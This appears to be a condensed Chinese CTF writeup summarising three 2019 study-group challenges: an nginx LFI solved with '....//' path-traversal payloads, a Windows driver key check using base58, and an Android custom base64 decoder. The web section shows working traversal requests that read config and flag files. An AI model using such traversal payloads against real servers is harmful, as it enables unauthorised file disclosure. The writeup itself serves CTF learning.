---
title: CTF 学习交流群第四期 writeup 大放送
contest: CTF 学习交流群
year: 2019
difficulty: easy
vuln_type: web_unknown
tags: [web, lfi, windows driver, base58, android reverse, 自定义 base64]
attack_chain: |
  1. virink_web: /preview?f=....//....//....//....//....//....//etc..//nginx..//conf.d..//default.conf LFI 路径穿越 (项目 https://github.com/CTFTraining/virink_2019_web_files_share)
  2. 读 nginx config → /preview.lua → ../../../../f1ag_Is_h3re/flag
  3. 政博_windows驱动: DeviceIoControl 控制码 0x22a444 发送数据 + 0x226448 接收验证 → 驱动 base58 编码后存到 dword_403264 → 提交与 base58(KkYWdwLPHPjzTfpEwLa4qQMxGC) 解码结果对比
  4. base58decode: long_value += b58chars.find(c) * (b58base ** i) → result = chr(mod) + result → nPad = leading '1' count
  5. 天河_安卓 (rev): Reverse(s, n) 字符串反转 + 自定义 base64 字母表 lmnopqrABCDEdefghFGXYZabcijkstuvwxyz012STUVW3456789+/HIJKLMNOPQR + 每 3 字节 Reverse 字母表
  6. encode: b0>>2 & 0x3F | b0<<4|b1>>4 | b1<<2|b2>>6 | b2 & 0x3F
  7. decode("2ifuiJ4F6VMwaY8ATEr7db/=") → 17 字节原文
key_payload: |
  /preview?f=....//....//....//....//....//....//etc..//nginx..//conf.d..//default.conf
  /preview?f=....//preview.lua
  /preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag
  KkYWdwLPHPjzTfpEwLa4qQMxGC  # base58 → 原文
  2ifuiJ4F6VMwaY8ATEr7db/=      # 自定义 base64 → 17 字节
one_liner: 老群 473831530 第 4 期混着三道题 (LFI / Windows 驱动 base58 / 安卓自定义 base64) 的速查合集。
lesson: LFI 路径穿越用 `....//` 反复绕过 strip；Windows 驱动 DeviceIoControl 控制码 0x22a444/0x226448 是入门标配；自定义 base64 + 字母表每 3 字节反转是安卓题常见 trick。
quality: low
---

# CTF 学习交流群第四期 writeup 大放送

> 来源: ctfiot.com 92920

## 群背景

CTF 学习交流群 (群号 473831530) 第 4 期题目 writeup，由 virink / 郁离歌 / 政博 / 天河师傅出题，作者 pcat 等供稿。第 5 期题目正在征集。

## virink_web: LFI

```http
/preview?f=....//....//....//....//....//....//etc..//nginx..//conf.d..//default.conf
/preview?f=....//preview.lua
/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag
```

用 `....//` 反复绕过 `../` strip（每个 `.` + `/` 加点变 4 个点）。virink 师傅开源了项目（代码有修改）：https://github.com/CTFTraining/virink_2019_web_files_share

## 政博_windows驱动: base58

- 驱动文件 `.sys`，逻辑不复杂
- 与驱动交互的程序：User=Processor → 输入 key
- DeviceIoControl 控制码：
  - `0x22a444` — 发送 key 数据
  - `0x226448` — 接收驱动返回判断 key 是否正确
- 驱动内部把 `dword_403264` 与 base58 解码结果对比
- dword_403264 写入路径：base58(KkYWdwLPHPjzTfpEwLa4qQMxGC)

**base58 解码：**
```python
__b58chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def b58decode(v):
    long_value = 0
    for i, c in enumerate(v[::-1]):
        long_value += __b58chars.find(c) * (58 ** i)
    result = ''
    while long_value >= 256:
        div, mod = divmod(long_value, 58)
        result = chr(mod) + result
        long_value = div
    result = chr(long_value) + result
    return result
```

## 天河_安卓: 自定义 base64 + 字母表反转

```c
// 字母表: lmnopqrABCDEdefghFGXYZabcijkstuvwxyz012STUVW3456789+/HIJKLMNOPQR
// 64 字符，但每 3 字节调用 Reverse(ALPHA_BASE, 64) 反转
char *decode(const char *base64Char, ..., char *originChar, ...) {
    char ALPHA_BASE[] = "lmnopqrABCDEdefghFGXYZabcijkstuvwxyz012STUVW3456789+/HIJKLMNOPQR";
    for (int i = 0; i < base64CharSize; i += 4) {
        Reverse(ALPHA_BASE, 64);  // 每 4 字符反转一次
        // 重建 toInt 查表
        ...
    }
}

int main() {
    char *base = "2ifuiJ4F6VMwaY8ATEr7db/=";
    char c[256];
    decode(base, strlen(base), c, 17);
    printf("%s", c);
}
```

## 评价

第 4 期合集 (LFI + Windows 驱动 + 安卓)，前两位作者还都注明"花括号换为英文"，整体属于入群练习题。Question 5 在 10 月开放（截止未提），所以只有 Q1-Q4 三道题。

招新广告：ChaMd5 ctf 组长期招新 (crypto+reverse+pwn+合约方向)，联系 admin@chamd5.org。
